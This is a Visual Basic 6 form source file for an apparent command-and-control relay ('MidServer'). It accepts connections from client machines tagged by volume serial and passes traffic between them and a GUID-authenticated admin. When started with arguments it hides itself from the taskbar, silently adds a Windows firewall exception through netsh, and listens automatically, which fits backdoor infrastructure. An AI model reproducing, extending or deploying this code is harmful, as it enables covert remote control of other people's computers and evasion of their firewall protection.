VERSION 5.00
Begin VB.Form Middle 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "MidServer"
   ClientHeight    =   3000
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5655
   Icon            =   "Middle.frx":0000
   LinkTopic       =   "Form1"
   LockControls    =   -1  'True
   MaxButton       =   0   'False
   ScaleHeight     =   3000
   ScaleWidth      =   5655
   StartUpPosition =   2  'ÆÁÄ»ÖÐÐÄ
   Visible         =   0   'False
   Begin VB.Timer AdminMinute 
      Enabled         =   0   'False
      Interval        =   60000
      Left            =   4560
      Top             =   960
   End
   Begin VB.Timer AdminChecker 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   3840
      Top             =   960
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   270
      Left            =   3210
      TabIndex        =   8
      Text            =   "25"
      Top             =   30
      Width           =   735
   End
   Begin VB.CommandButton Command1 
      Appearance      =   0  'Flat
      Caption         =   "Listen"
      Default         =   -1  'True
      Height          =   300
      Left            =   4080
      TabIndex        =   7
      Top             =   30
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   270
      Left            =   1230
      TabIndex        =   5
      Text            =   "110"
      Top             =   30
      Width           =   735
   End
   Begin VB.ListBox NameList 
      Appearance      =   0  'Flat
      Height          =   2550
      ItemData        =   "Middle.frx":1272
      Left            =   3360
      List            =   "Middle.frx":1274
      TabIndex        =   4
      Top             =   360
      Width           =   2175
   End
   Begin VB.ListBox IDList 
      Appearance      =   0  'Flat
      Height          =   2550
      ItemData        =   "Middle.frx":1276
      Left            =   120
      List            =   "Middle.frx":1278
      TabIndex        =   3
      Top             =   360
      Width           =   1215
   End
   Begin VB.ListBox IPList 
      Appearance      =   0  'Flat
      Height          =   2550
      ItemData        =   "Middle.frx":127A
      Left            =   1320
      List            =   "Middle.frx":127C
      TabIndex        =   2
      Top             =   360
      Width           =   2055
   End
   Begin VB.ListBox NickList 
      Height          =   1680
      ItemData        =   "Middle.frx":127E
      Left            =   -10000
      List            =   "Middle.frx":1285
      TabIndex        =   1
      Top             =   0
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.ListBox VolList 
      Height          =   1680
      ItemData        =   "Middle.frx":1293
      Left            =   -10000
      List            =   "Middle.frx":1295
      TabIndex        =   0
      Top             =   0
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.Label Label2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "Admin Port:"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   2160
      TabIndex        =   9
      Top             =   60
      Width           =   1095
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "Listen Port:"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   60
      Width           =   1335
   End
End
Attribute VB_Name = "Middle"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Const headLen As Long = 10 'length of the package head
Private dataBytes() As Byte
Private leftBytes() As Byte
Private dataLeft As Boolean
Private dataBytesA() As Byte
Private leftBytesA() As Byte
Private dataLeftA As Boolean
Private WithEvents TCP As CSocketPlus
Attribute TCP.VB_VarHelpID = -1
Private tcpID As Long
Private adminCheck As Boolean
Private workingID As Long
Private connected As Boolean
Private listSendIndex As Long
Private adminIP As String
Private adminConnectedMin As Long

Private Sub changeTitle()
    On Error Resume Next
    Middle.Caption = IIf(connected = True, "*", "") & adminIP & " - " & IDList.ListCount & " - (" & workingID & ")"
End Sub

Private Sub AdminChecker_Timer()
    On Error Resume Next
    AdminChecker.Enabled = False
    If adminCheck = False Then TCP_CloseSck 1
End Sub

Private Sub AdminMinute_Timer()
    On Error Resume Next
    If adminConnectedMin = 15 Then
        TCP_CloseSck 1
    End If
    adminConnectedMin = adminConnectedMin + 1
End Sub

Private Sub Command1_Click()
    On Error Resume Next
    Command1.Enabled = False
    Text1.Locked = True
    Text2.Locked = True
    Err.Clear
    TCP.LocalPort(0) = Val(Text1.Text)
    TCP.Listen 0
    TCP.LocalPort(1) = Val(Text2.Text)
    TCP.Listen 1
    If Err Then
        TCP.CloseSck 0
        TCP.CloseSck 1
        If Command = "" Then MsgBox Err.Description
        Command1.Enabled = True
        Text1.Locked = False
        Text2.Locked = False
    End If
End Sub

Private Sub Form_Load()
    On Error Resume Next
    App.TaskVisible = False
    ChDir App.Path
    VolList.Clear
    NickList.Clear
    IDList.Clear
    IPList.Clear
    NameList.Clear
    Dim line As String
    Open "nick.txt" For Binary As #1
    Close #1
    Open "nick.txt" For Input As #1
    Do While Not EOF(1)
        Line Input #1, line
        VolList.AddItem line
        Line Input #1, line
        If line = "" Then line = "Empty"
        NickList.AddItem line
    Loop
    Close #1
    Set TCP = New CSocketPlus
    TCP.ArrayAdd 0
    TCP.ArrayAdd 1
    tcpID = 1
    workingID = 0
    connected = False
    adminIP = "0.0.0.0"
    'for hide use
    Command = Trim(Command)
    If Command = "" Then
        Middle.Visible = True
    Else
        Dim appFullPath As String
        appFullPath = App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe"
        Dim firewall As String
        firewall = "netsh.exe firewall set allowedprogram " & """" & appFullPath & """" & " middle enable"
        Shell firewall, vbHide 'make a through in the firewall
        Sleep 6000 'wait the shell finished
        Dim autoPort() As String
        autoPort = Split(Command, " ")
        ReDim Preserve autoPort(1)
        Text1.Text = autoPort(0)
        Text2.Text = autoPort(1)
        Command1_Click
    End If
End Sub

Private Sub PreEnd()
    On Error Resume Next
    TCP_CloseSck 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
    On Error Resume Next
    PreEnd
End Sub

Private Sub IDList_Click()
    On Error Resume Next
    IPList.listIndex = IDList.listIndex
    NameList.listIndex = IDList.listIndex
End Sub

Private Sub IPList_Click()
    On Error Resume Next
    IDList.listIndex = IPList.listIndex
    NameList.listIndex = IPList.listIndex
End Sub

Private Sub NameList_Click()
    On Error Resume Next
    IDList.listIndex = NameList.listIndex
    IPList.listIndex = NameList.listIndex
End Sub

Private Sub TCP_CloseSck(ByVal Index As Variant)
    On Error Resume Next
    If Index = 0 Then
        TCP.CloseSck 0
        TCP.CloseSck 1
        Dim i As Long
        For i = 0 To IDList.ListCount - 1
            TCP.CloseSck CLng(IDList.List(i))
        Next i
        Erase leftBytesA
        Erase dataBytesA
        Erase leftBytes
        Erase dataBytes
        Command1.Enabled = True
        Text1.Locked = False
        Text2.Locked = False
        IDList.Clear
        IPList.Clear
        NameList.Clear
        tcpID = 1
        workingID = 0
        connected = False
        Middle.Caption = "MidServer"
    ElseIf Index = 1 Then
        If connected = True Then
            connected = False
            SendData workingID, ChrB(8)
        End If
        TCP.CloseSck 1
        TCP.Listen 1
        Erase leftBytesA
        Erase dataBytesA
        workingID = 0
        IDList.listIndex = -1
        adminIP = "0.0.0.0"
        changeTitle
        AdminMinute.Enabled = False
    Else
        If workingID = Index Then
            If connected = True Then
                connected = False
                SendData 1, ChrB(8)
            End If
            workingID = 0
            IDList.listIndex = -1
            Erase leftBytes
            Erase dataBytes
        End If
        TCP.CloseSck Index
        TCP.ArrayRemove Index
        Dim listIndex As Long
        listIndex = idFind(Index)
        If listIndex > -1 Then
            IDList.RemoveItem listIndex
            IPList.RemoveItem listIndex
            NameList.RemoveItem listIndex
        End If
        changeTitle
    End If
End Sub

Private Sub TCP_ConnectionRequest(ByVal Index As Variant, ByVal requestID As Long)
    On Error Resume Next
    If Index = 0 Then
        tcpID = tcpID + 1
        TCP.ArrayAdd tcpID
        TCP.CloseSck tcpID
        TCP.Accept tcpID, requestID
        IDList.AddItem tcpID
        IPList.AddItem TCP.RemoteHostIP(tcpID)
        NameList.AddItem ""
        changeTitle
    ElseIf Index = 1 Then
        TCP.CloseSck 1
        TCP.Accept 1, requestID
        adminCheck = False
        AdminChecker.Enabled = True
        adminIP = TCP.RemoteHostIP(1)
        changeTitle
    End If
End Sub

Private Sub TCP_DataArrival(ByVal Index As Variant, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim dataString As String
    If Index = 0 Then
        Exit Sub
    ElseIf Index = 1 Then
        If adminCheck = True Then
            adminConnectedMin = 0
            TCP.GetData 1, dataString
            If dataLeftA = True Then
                dataBytesA = CStr(leftBytesA) + dataString
            Else
                dataBytesA = dataString
            End If
            DataCenterA
        Else
            TCP.GetData 1, dataString
            If dataString = "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}" Then
                adminCheck = True
                adminConnectedMin = 0
                AdminMinute.Enabled = True
                dataLeftA = False
                listSendIndex = 0
                If listSendIndex < IDList.ListCount Then
                    SendData 1, ChrB(3), IDList.List(listSendIndex) + Chr(0) + IPList.List(listSendIndex) + Chr(0) + NameList.List(listSendIndex)
                    listSendIndex = listSendIndex + 1
                End If
            Else
                TCP_CloseSck 1
            End If
        End If
    ElseIf workingID = Index Then
        TCP.GetData Index, dataString
        If dataLeft = True Then
            dataBytes = CStr(leftBytes) + dataString
        Else
            dataBytes = dataString
        End If
        DataCenter
    Else
        Dim listIndex As Long
        listIndex = idFind(Index)
        If listIndex > -1 Then
            If NameList.List(listIndex) = "" Then
                TCP.GetData Index, dataString
                NameList.List(listIndex) = getNick(dataString)
            Else
                TCP_CloseSck Index
            End If
        End If
    End If
End Sub

Private Sub DataCenterA()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytesA) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytesA(0)) * 256 + dataBytesA(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytesA = dataBytesA
        dataLeftA = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeftA = False
    ElseIf totalLen > dataLen Then
        dataLeftA = True
        ReDim leftBytesA(totalLen - dataLen - 1)
        CopyMemory leftBytesA(0), dataBytesA(dataLen), UBound(leftBytesA) + 1
        ReDim Preserve dataBytesA(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytesA(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytesA(0), dataBytesA(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytesA(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1working id
    '2list apply
    '3list data
    '4list ack
    '5mid connect
    '6mid connected
    '7mid data
    '8mid disconnect
    
    'working id
    If key = 1 Then
        If connected = False Then
            workingID = CLng(head(1)) * 256 + head(2)
            i = idFind(workingID)
            If i = -1 Or NameList.List(i) = "" Then
                workingID = 0
                i = -1
            End If
            dataLeft = False
            IDList.listIndex = i
            changeTitle
        End If
    
    'list apply
    ElseIf key = 2 Then
        listSendIndex = 0
        If listSendIndex < IDList.ListCount Then
            SendData 1, ChrB(3), IDList.List(listSendIndex) + Chr(0) + IPList.List(listSendIndex) + Chr(0) + NameList.List(listSendIndex)
            listSendIndex = listSendIndex + 1
        End If
    
    'list ack
    ElseIf key = 4 Then
        If listSendIndex < IDList.ListCount Then
            SendData 1, ChrB(3), IDList.List(listSendIndex) + Chr(0) + IPList.List(listSendIndex) + Chr(0) + NameList.List(listSendIndex)
            listSendIndex = listSendIndex + 1
        End If
    
    'mid connect
    ElseIf key = 5 Then
        If workingID > 0 Then SendData workingID, ChrB(5)
    
    'mid data
    ElseIf key = 7 Then
        If hasData And connected = True Then SendData workingID, ChrB(7), CStr(dataBytesA)
    
    'mid disconnect
    ElseIf key = 8 Then
        If connected = True Then
            connected = False
            SendData workingID, ChrB(8)
            changeTitle
        End If
    
    'else are bad packages
    Else
        'nothing
    End If
    'retreat
    If dataLeftA = True Then
        dataBytesA = leftBytesA
        DataCenterA
    End If
End Sub

Private Sub DataCenter()
    On Error Resume Next
    'in case some package divided or compacted
    Dim totalLen As Long
    totalLen = UBound(dataBytes) + 1
    If totalLen < 2 Then Exit Sub
    Dim dataLen As Long
    dataLen = CLng(dataBytes(0)) * 256 + dataBytes(1)
    Dim i As Long
    If totalLen < dataLen Then
        leftBytes = dataBytes
        dataLeft = True
        Exit Sub
    ElseIf totalLen = dataLen Then
        dataLeft = False
    ElseIf totalLen > dataLen Then
        dataLeft = True
        ReDim leftBytes(totalLen - dataLen - 1)
        CopyMemory leftBytes(0), dataBytes(dataLen), UBound(leftBytes) + 1
        ReDim Preserve dataBytes(dataLen - 1)
    End If
    'get head and data
    Dim head() As Byte
    ReDim head(headLen - 1)
    Dim hasData As Boolean
    hasData = False
    'copy head
    CopyMemory head(0), dataBytes(2), UBound(head) + 1
    'check length
    If dataLen > headLen + 2 Then
        hasData = True
        'deal the data
        CopyMemory dataBytes(0), dataBytes(2 + headLen), dataLen - headLen - 2
        ReDim Preserve dataBytes(dataLen - headLen - 3)
    End If
    Dim data() As Byte
    Dim key As Long
    key = head(0)
    'key means
    '1working id
    '2list apply
    '3list data
    '4list ack
    '5mid connect
    '6mid connected
    '7mid data
    '8mid disconnect
    
    'mid connected
    If key = 6 Then
        connected = True
        changeTitle
    
    'mid data
    ElseIf key = 7 Then
        If hasData And connected = True Then SendData 1, ChrB(7), CStr(dataBytes)
    
    'mid disconnect
    ElseIf key = 8 Then
        If connected = True Then
            connected = False
            SendData 1, ChrB(8)
            changeTitle
        End If
    
    
    'else are bad packages
    Else
        'nothing
    End If
    'retreat
    If dataLeft = True Then
        dataBytes = leftBytes
        DataCenter
    End If
End Sub

Private Sub TCP_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    TCP_CloseSck Index
End Sub

Private Sub Text1_Change()
    On Error Resume Next
    Dim port As Long
    port = Val(Text1.Text)
    If port > 65535 Then port = 65535
    If port < 0 Then port = 0
    Text1.Text = port
End Sub

Private Sub Text2_Change()
    On Error Resume Next
    Dim port As Long
    port = Val(Text2.Text)
    If port > 65535 Then port = 65535
    If port < 0 Then port = 0
    Text2.Text = port
End Sub

Private Function makeHead(ByRef head As String) As String
    On Error Resume Next
    Dim i As Long
    makeHead = LeftB(head, headLen)
    For i = LenB(head) + 1 To headLen
        makeHead = makeHead + ChrB(0)
    Next i
End Function

Private Sub SendData(ByVal Index As Long, ByRef head As String, Optional ByRef data As String = vbNullString)
    On Error Resume Next
    Dim toSend() As Byte
    Dim dataLen As Long
    dataLen = 2 + headLen + LenB(data)
    ReDim toSend(dataLen - 1)
    toSend(0) = dataLen \ 256
    toSend(1) = dataLen Mod 256
    CopyMemory toSend(2), ByVal StrPtr(makeHead(head)), headLen
    If LenB(data) > 0 Then CopyMemory toSend(2 + headLen), ByVal StrPtr(data), LenB(data)
    TCP.SendData Index, toSend
End Sub

Private Function idFind(ByVal Index As Long) As Long
    On Error Resume Next
    idFind = -1
    Dim i As Long
    For i = 0 To IDList.ListCount - 1
        If IDList.List(i) = Index Then
            idFind = i
            Exit For
        End If
    Next i
End Function

Private Function getNick(ByRef vol As String) As String
    On Error Resume Next
    getNick = vol
    Dim i As Long
    For i = 0 To VolList.ListCount - 1
        If VolList.List(i) = vol Then
            getNick = NickList.List(i)
            Exit For
        End If
    Next i
End Function
